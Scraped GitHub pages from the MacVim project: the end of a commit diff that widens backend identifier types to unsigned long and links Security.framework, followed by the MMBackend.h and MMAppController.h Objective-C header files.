|  |  | ASLogDebug(@"pid=%d id=%lu", pid, identifier); |
|  |  |  |
|  |  | // NOTE! This message can arrive at pretty much anytime, e.g. while |
|  |  | // the run loop is the 'event tracking' mode. This means that Cocoa may |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[src/MacVim/MacVim.h](#diff-aeb9e5f8e06d8cd652aeab7cc97189970f4434f5bf632338331b39412116a071 "src/MacVim/MacVim.h")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MacVim.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -197,9 +197,9 @@ typedef NSString\* NSAttributedStringKey; |
|  |  | // connectBackend:pid: and processInput:forIdentifier:). |
|  |  | // |
|  |  | @protocol MMAppProtocol |
|  |  | - (unsigned)connectBackend:(byref in id <MMBackendProtocol>)proxy pid:(int)pid; |
|  |  | - (unsigned long)connectBackend:(byref in id <MMBackendProtocol>)proxy pid:(int)pid; |
|  |  | - (oneway void)processInput:(in bycopy NSArray \*)queue |
|  |  | forIdentifier:(unsigned)identifier; |
|  |  | forIdentifier:(unsigned long)identifier; |
|  |  | - (NSArray \*)serverList; |
|  |  | @end |
|  |  |  |
| Expand Down | |  |

4 changes: 4 additions & 0 deletions

4
[src/MacVim/MacVim.xcodeproj/project.pbxproj](#diff-0ff510ea46bb007ac01a0e3491ea2a3f777d4fcb407def735bf2929f6feb2443 "src/MacVim/MacVim.xcodeproj/project.pbxproj")

Show comments

[View file](/macvim-dev/macvim/blob/399b43e9e1dbf656a1780e87344f4d3c875e4cda/src/MacVim/MacVim.xcodeproj/project.pbxproj)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -74,6 +74,7 @@ |
|  |  | 909894382A56EB1E007B84A3 /\* WhatsNew.xib in Resources \*/ = {isa = PBXBuildFile; fileRef = 909894362A56EB1E007B84A3 /\* WhatsNew.xib \*/; }; |
|  |  | 9098943C2A56ECF6007B84A3 /\* MMWhatsNewController.m in Sources \*/ = {isa = PBXBuildFile; fileRef = 9098943B2A56ECF6007B84A3 /\* MMWhatsNewController.m \*/; }; |
|  |  | 90A33BEA28D563DF003A2E2F /\* MMSparkle2Delegate.m in Sources \*/ = {isa = PBXBuildFile; fileRef = 90A33BE928D563DF003A2E2F /\* MMSparkle2Delegate.m \*/; }; |
|  |  | 90AF83AB2A8C37F70046DA2E /\* Security.framework in Frameworks \*/ = {isa = PBXBuildFile; fileRef = 90AF83A92A8C37F70046DA2E /\* Security.framework \*/; }; |
|  |  | 90B9877D2A579F9500FC95D6 /\* WebKit.framework in Frameworks \*/ = {isa = PBXBuildFile; fileRef = 90B9877B2A579F9500FC95D6 /\* WebKit.framework \*/; settings = {ATTRIBUTES = (Weak, ); }; }; |
|  |  | /\* End PBXBuildFile section \*/ |
|  |  |  |
| Expand Down  Expand Up | | @@ -423,6 +424,7 @@ |
|  |  | 90AF83B62AA15C660046DA2E /\* nv\_cmds.h \*/ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; name = nv\_cmds.h; path = ../nv\_cmds.h; sourceTree = "<group>"; }; |
|  |  | 90AF83B72AA15C660046DA2E /\* vim9cmds.c \*/ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; name = vim9cmds.c; path = ../vim9cmds.c; sourceTree = "<group>"; }; |
|  |  | 90AF83B82AA15C660046DA2E /\* termdefs.h \*/ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; name = termdefs.h; path = ../termdefs.h; sourceTree = "<group>"; }; |
|  |  | 90AF83A92A8C37F70046DA2E /\* Security.framework \*/ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Security.framework; path = System/Library/Frameworks/Security.framework; sourceTree = SDKROOT; }; |
|  |  | 90B9877B2A579F9500FC95D6 /\* WebKit.framework \*/ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebKit.framework; path = System/Library/Frameworks/WebKit.framework; sourceTree = SDKROOT; }; |
|  |  | 90F84F1E2521F2270000268B /\* ko \*/ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ko; path = ko.lproj/MainMenu.strings; sourceTree = "<group>"; }; |
|  |  | 90F84F232521F6480000268B /\* ca \*/ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ca; path = ca.lproj/MainMenu.strings; sourceTree = "<group>"; }; |
| Expand Down  Expand Up | | @@ -462,6 +464,7 @@ |
|  |  | isa = PBXFrameworksBuildPhase; |
|  |  | buildActionMask = 2147483647; |
|  |  | files = ( |
|  |  | 90AF83AB2A8C37F70046DA2E /\* Security.framework in Frameworks \*/, |
|  |  | 90B9877D2A579F9500FC95D6 /\* WebKit.framework in Frameworks \*/, |
|  |  | 1DFE25A50C527BC4003000F7 /\* PSMTabBarControl.framework in Frameworks \*/, |
|  |  | 8D11072F0486CEB800E47090 /\* Cocoa.framework in Frameworks \*/, |
| Expand Down  Expand Up | | @@ -650,6 +653,7 @@ |
|  |  | 29B97323FDCFA39411CA2CEA /\* Frameworks \*/ = { |
|  |  | isa = PBXGroup; |
|  |  | children = ( |
|  |  | 90AF83A92A8C37F70046DA2E /\* Security.framework \*/, |
|  |  | 90B9877B2A579F9500FC95D6 /\* WebKit.framework \*/, |
|  |  | 52A364721C4A5789005757EC /\* Sparkle.framework \*/, |
|  |  | 1D8B5A52104AF9FF002E59D5 /\* Carbon.framework \*/, |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `399b43e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fcommit%2F399b43e9e1dbf656a1780e87344f4d3c875e4cda) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_739627dd_20250115_095932.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fblob%2Fd9de087dddadbfd82fcb5dc9734380a2f829bd0a%2Fsrc%2FMacVim%2FMMBackend.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fblob%2Fd9de087dddadbfd82fcb5dc9734380a2f829bd0a%2Fsrc%2FMacVim%2FMMBackend.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=macvim-dev%2Fmacvim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[macvim-dev](/macvim-dev)
/
**[macvim](/macvim-dev/macvim)**
Public

* [Notifications](/login?return_to=%2Fmacvim-dev%2Fmacvim) You must be signed in to change notification settings
* [Fork
  682](/login?return_to=%2Fmacvim-dev%2Fmacvim)
* [Star
   7.6k](/login?return_to=%2Fmacvim-dev%2Fmacvim)

* [Code](/macvim-dev/macvim)
* [Issues
  172](/macvim-dev/macvim/issues)
* [Pull requests
  7](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

Additional navigation options

* [Code](/macvim-dev/macvim)
* [Issues](/macvim-dev/macvim/issues)
* [Pull requests](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

## Files

 d9de087
## Breadcrumbs

1. [macvim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a)
2. /[src](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src)
3. /[MacVim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim)
/
# MMBackend.h

Copy path Blame  Blame
## Latest commit

## History

[History](/macvim-dev/macvim/commits/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMBackend.h)174 lines (153 loc) · 6 KB d9de087
## Breadcrumbs

1. [macvim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a)
2. /[src](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src)
3. /[MacVim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim)
/
# MMBackend.h

Top
## File metadata and controls

* Code
* Blame

174 lines (153 loc) · 6 KB[Raw](https://github.com/macvim-dev/macvim/raw/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMBackend.h)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174/\* vi:set ts=8 sts=4 sw=4 ft=objc: \* \* VIM - Vi IMproved by Bram Moolenaar \* MacVim GUI port by Bjorn Winckler \* \* Do ":help uganda" in Vim to read copying and usage conditions. \* Do ":help credits" in Vim to see a list of people who contributed. \* See README.txt for an overview of the Vim source code. \*/
#import <Foundation/Foundation.h>#import "MacVim.h"#import "vim.h"
@interface MMBackend : NSObject <MMBackendProtocol, MMVimServerProtocol, MMVimClientProtocol> { NSMutableArray \*outputQueue; NSMutableArray \*inputQueue; NSMutableData \*drawData; NSConnection \*connection; NSConnection \*vimServerConnection; id appProxy; unsigned identifier; NSDictionary \*colorDict; NSDictionary \*sysColorDict; NSDictionary \*actionDict; BOOL tabBarVisible; unsigned backgroundColor; unsigned foregroundColor; unsigned specialColor; unsigned defaultBackgroundColor; unsigned defaultForegroundColor; id dialogReturn; NSTimer \*blinkTimer; int blinkState; NSTimeInterval blinkWaitInterval; NSTimeInterval blinkOnInterval; NSTimeInterval blinkOffInterval; NSMutableDictionary \*connectionNameDict; NSMutableDictionary \*clientProxyDict; NSMutableDictionary \*serverReplyDict; NSString \*alternateServerName; GuiFont oldWideFont; BOOL isTerminating; BOOL waitForAck; int initialWindowLayout; BOOL flushDisabled; unsigned numWholeLineChanges; unsigned offsetForDrawDataPrune; BOOL imState; int winposX; int winposY; BOOL addToFindPboardOverride;#ifdef FEAT\_BEVAL NSString \*lastToolTip;#endif}
+ (MMBackend \*)sharedInstance;
- (void)setBackgroundColor:(int)color;- (void)setForegroundColor:(int)color;- (void)setSpecialColor:(int)color;- (void)setDefaultColorsBackground:(int)bg foreground:(int)fg;- (NSConnection \*)connection;- (NSDictionary \*)actionDict;- (int)initialWindowLayout;- (void)getWindowPositionX:(int\*)x Y:(int\*)y;- (void)setWindowPositionX:(int)x Y:(int)y;
- (void)queueMessage:(int)msgid properties:(NSDictionary \*)props;- (BOOL)checkin;- (BOOL)openGUIWindow;- (void)clearAll;- (void)clearBlockFromRow:(int)row1 column:(int)col1 toRow:(int)row2 column:(int)col2;- (void)deleteLinesFromRow:(int)row count:(int)count scrollBottom:(int)bottom left:(int)left right:(int)right;- (void)drawString:(char\_u\*)s length:(int)len row:(int)row column:(int)col cells:(int)cells flags:(int)flags;- (void)insertLinesFromRow:(int)row count:(int)count scrollBottom:(int)bottom left:(int)left right:(int)right;- (void)drawCursorAtRow:(int)row column:(int)col shape:(int)shape fraction:(int)percent color:(int)color;- (void)drawInvertedRectAtRow:(int)row column:(int)col numRows:(int)nr numColumns:(int)nc invert:(int)invert;- (void)drawSign:(NSString \*)imgName atRow:(int)row column:(int)col width:(int)width height:(int)height;- (void)update;- (void)flushQueue:(BOOL)force;- (BOOL)waitForInput:(int)milliseconds;- (void)exit;- (void)selectTab:(int)index;- (void)updateTabBar;- (BOOL)tabBarVisible;- (void)showTabBar:(BOOL)enable;- (void)setRows:(int)rows columns:(int)cols;- (void)resizeView;- (void)setWindowTitle:(char \*)title;- (void)setDocumentFilename:(char \*)filename;- (char \*)browseForFileWithAttributes:(NSDictionary \*)attr;- (int)showDialogWithAttributes:(NSDictionary \*)attr textField:(char \*)txtfield;- (void)showToolbar:(int)enable flags:(int)flags;- (void)createScrollbarWithIdentifier:(int32\_t)ident type:(int)type;- (void)destroyScrollbarWithIdentifier:(int32\_t)ident;- (void)showScrollbarWithIdentifier:(int32\_t)ident state:(int)visible;- (void)setScrollbarPosition:(int)pos length:(int)len identifier:(int32\_t)ident;- (void)setScrollbarThumbValue:(long)val size:(long)size max:(long)max identifier:(int32\_t)ident;- (void)setFont:(GuiFont)font wide:(BOOL)wide;- (void)executeActionWithName:(NSString \*)name;- (void)setMouseShape:(int)shape;- (void)setBlinkWait:(int)wait on:(int)on off:(int)off;- (void)startBlink;- (void)stopBlink:(BOOL)updateCursor;- (void)adjustLinespace:(int)linespace;- (void)adjustColumnspace:(int)columnspace;- (void)activate;- (void)setPreEditRow:(int)row column:(int)col;
- (void)showDefinition:(NSString \*)text row:(int)row col:(int)col;
- (int)lookupColorWithKey:(NSString \*)key;- (BOOL)hasSpecialKeyWithValue:(char\_u \*)value;
- (void)enterFullScreen:(int)fuoptions background:(int)bg;- (void)leaveFullScreen;- (void)setFullScreenBackgroundColor:(int)color;
- (void)setAntialias:(BOOL)antialias;- (void)setLigatures:(BOOL)ligatures;- (void)setThinStrokes:(BOOL)thinStrokes;- (void)setBlurRadius:(int)radius;- (void)setBackground:(int)dark;
- (void)updateModifiedFlag;
- (void)registerServerWithName:(NSString \*)name;- (BOOL)sendToServer:(NSString \*)name string:(NSString \*)string reply:(char\_u \*\*)reply port:(int \*)port expression:(BOOL)expr silent:(BOOL)silent;- (NSArray \*)serverList;- (NSString \*)peekForReplyOnPort:(int)port;- (NSString \*)waitForReplyOnPort:(int)port timeout:(NSTimeInterval)timeout;- (BOOL)sendReply:(NSString \*)reply toPort:(int)port;
- (BOOL)waitForAck;- (void)setWaitForAck:(BOOL)yn;- (void)waitForConnectionAcknowledgement;
- (BOOL)addToFindPboardOverride;- (void)clearAddToFindPboardOverride;
- (BOOL)imState;- (void)setImState:(BOOL)activated;
#ifdef FEAT\_BEVAL- (void)setLastToolTip:(NSString \*)toolTip;#endif
- (void)addToMRU:(NSArray \*)filenames;
@end
@interface NSString (VimStrings)+ (id)stringWithVimString:(char\_u \*)s;- (char\_u \*)vimStringSave;@end

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_da37759d_20250115_095930.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fblob%2Fd9de087dddadbfd82fcb5dc9734380a2f829bd0a%2Fsrc%2FMacVim%2FMMAppController.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmacvim-dev%2Fmacvim%2Fblob%2Fd9de087dddadbfd82fcb5dc9734380a2f829bd0a%2Fsrc%2FMacVim%2FMMAppController.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=macvim-dev%2Fmacvim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[macvim-dev](/macvim-dev)
/
**[macvim](/macvim-dev/macvim)**
Public

* [Notifications](/login?return_to=%2Fmacvim-dev%2Fmacvim) You must be signed in to change notification settings
* [Fork
  682](/login?return_to=%2Fmacvim-dev%2Fmacvim)
* [Star
   7.6k](/login?return_to=%2Fmacvim-dev%2Fmacvim)

* [Code](/macvim-dev/macvim)
* [Issues
  172](/macvim-dev/macvim/issues)
* [Pull requests
  7](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

Additional navigation options

* [Code](/macvim-dev/macvim)
* [Issues](/macvim-dev/macvim/issues)
* [Pull requests](/macvim-dev/macvim/pulls)
* [Discussions](/macvim-dev/macvim/discussions)
* [Actions](/macvim-dev/macvim/actions)
* [Wiki](/macvim-dev/macvim/wiki)
* [Security](/macvim-dev/macvim/security)
* [Insights](/macvim-dev/macvim/pulse)

## Files

 d9de087
## Breadcrumbs

1. [macvim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a)
2. /[src](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src)
3. /[MacVim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim)
/
# MMAppController.h

Copy path Blame  Blame
## Latest commit

## History

[History](/macvim-dev/macvim/commits/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMAppController.h)114 lines (97 loc) · 3.38 KB d9de087
## Breadcrumbs

1. [macvim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a)
2. /[src](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src)
3. /[MacVim](/macvim-dev/macvim/tree/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim)
/
# MMAppController.h

Top
## File metadata and controls

* Code
* Blame

114 lines (97 loc) · 3.38 KB[Raw](https://github.com/macvim-dev/macvim/raw/d9de087dddadbfd82fcb5dc9734380a2f829bd0a/src/MacVim/MMAppController.h)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/\* vi:set ts=8 sts=4 sw=4 ft=objc: \* \* VIM - Vi IMproved by Bram Moolenaar \* MacVim GUI port by Bjorn Winckler \* \* Do ":help uganda" in Vim to read copying and usage conditions. \* Do ":help credits" in Vim to see a list of people who contributed. \* See README.txt for an overview of the Vim source code. \*/
#import <Cocoa/Cocoa.h>#import "MacVim.h"
@class MMWindowController;@class MMVimController;
#if !DISABLE\_SPARKLE#if USE\_SPARKLE\_1@class SUUpdater;#else@class SPUStandardUpdaterController;@class MMSparkle2Delegate;#endif#endif
@interface MMAppController : NSObject < MMAppProtocol, NSUserInterfaceItemSearching#if MAC\_OS\_X\_VERSION\_MAX\_ALLOWED >= MAC\_OS\_X\_VERSION\_10\_14 , NSMenuItemValidation#endif> { NSConnection \*connection; NSMutableArray \*vimControllers; NSString \*openSelectionString; NSMutableDictionary \*pidArguments;
 NSMenu \*defaultMainMenu; NSMenu \*currentMainMenu; BOOL mainMenuDirty;
 NSMenuItem \*appMenuItemTemplate; NSMenuItem \*recentFilesMenuItem; NSMutableArray \*cachedVimControllers; int preloadPid; BOOL shouldActivateWhenNextWindowOpens; int numChildProcesses; NSMutableDictionary \*inputQueues; int processingFlag;
 BOOL hasShownWindowBefore; BOOL shouldShowWhatsNewPage; #if !DISABLE\_SPARKLE#if USE\_SPARKLE\_1 SUUpdater \*updater;#else SPUStandardUpdaterController \*updater; MMSparkle2Delegate \*sparkle2delegate; ///< Sparkle 2 delegate which allows us to customize the updater's behavior.#endif#endif
 FSEventStreamRef fsEventStream;}
+ (MMAppController \*)sharedInstance;- (NSMenu \*)defaultMainMenu;- (NSMenuItem \*)appMenuItemTemplate;- (MMVimController \*)keyVimController;- (void)removeVimController:(id)controller;- (void)windowControllerWillOpen:(MMWindowController \*)windowController;- (void)setMainMenu:(NSMenu \*)mainMenu;- (void)markMainMenuDirty:(NSMenu \*)mainMenu;- (void)refreshMainMenu;- (NSArray \*)filterOpenFiles:(NSArray \*)filenames;- (BOOL)openFiles:(NSArray \*)filenames withArguments:(NSDictionary \*)args;
- (void)refreshAllAppearances;- (void)refreshAllFonts;- (void)refreshAllResizeConstraints;- (void)refreshAllTextViews;
//// NSMenuItemValidation//- (BOOL)validateMenuItem:(NSMenuItem \*)item;
- (IBAction)newWindow:(id)sender;- (IBAction)newWindowAndActivate:(id)sender;- (IBAction)fileOpen:(id)sender;- (IBAction)selectNextWindow:(id)sender;- (IBAction)selectPreviousWindow:(id)sender;- (IBAction)orderFrontPreferencePanel:(id)sender;- (IBAction)openWebsite:(id)sender;- (IBAction)showWhatsNew:(id)sender;- (IBAction)showVimHelp:(id)sender withCmd:(NSString \*)cmd;- (IBAction)showVimHelp:(id)sender;- (IBAction)checkForUpdates:(id)sender;#if MAC\_OS\_X\_VERSION\_MIN\_REQUIRED < MAC\_OS\_X\_VERSION\_13- (IBAction)zoomAll:(id)sender;#endif- (IBAction)stayInFront:(id)sender;- (IBAction)stayInBack:(id)sender;- (IBAction)stayLevelNormal:(id)sender;
- (NSArray<NSString \*> \*)localizedTitlesForItem:(id)item;- (void)searchForItemsWithSearchString:(NSString \*)searchString resultLimit:(NSInteger)resultLimit matchedItemHandler:(void (^)(NSArray \*items))handleMatchedItems;- (void)performActionForItem:(id)item;
@end

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


